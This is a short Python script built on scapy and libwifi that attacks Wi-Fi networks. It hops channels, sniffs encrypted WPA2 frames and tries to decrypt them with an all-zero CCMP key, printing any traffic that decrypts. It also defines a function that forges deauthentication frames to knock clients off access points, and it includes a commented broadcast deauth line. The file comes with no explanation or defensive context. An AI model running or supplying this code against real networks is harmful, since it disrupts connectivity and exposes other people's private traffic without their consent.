import threading, os, time, random
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import libwifi
from libwifi import *

interface = "changeme"

def hopper(iface):
    n = 1
    stop_hopper = False
    while not stop_hopper:
        time.sleep(0.50)
        os.system('iwconfig %s channel %d' % (iface, n))
        dig = int(random.random() * 14)
        if dig != 0 and dig != n:
            n = dig

F_bssids = []    # Found BSSIDs
def findSSID(pkt):
	data = ""
	if(dot11_is_encrypted_data(pkt)):
		if(decrypt_ccmp(pkt, "\x00" * 16).startswith("\xAA\xAA\x03\x00\x00\x00")):
		    print("Data: %s" %(decrypt_ccmp(pkt, "\x00" * 16)))
		    pkt.show()


def deauth(ap, client):
    # Deauthentication Packet For Access Point
    pkt = RadioTap()/Dot11(addr1=client, addr2=ap, addr3=ap)/Dot11Deauth()
    sendp(pkt, iface=interface)
    print("Deauth to: %s" %(ap))


if __name__ == "__main__":
    #pket = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2="", addr3="")/Dot11Deauth(reason=2)
    #sendp(pket, iface=interface, verbose=False)
    thread = threading.Thread(target=hopper, args=(interface, ), name="hopper")
    thread.daemon = True
    thread.start()

    sniff(iface=interface, prn=findSSID, count=50, lfilter=lambda pkt: (Dot11CCMP in pkt or Dot11TKIP in pkt or Dot11Encrypted in pkt))
    #sniff(iface=interface, prn=findSSID, count=50, lfilter=lambda pkt: (Dot11CCMP in pkt or Dot11TKIP in pkt or Dot11Encrypted in pkt))
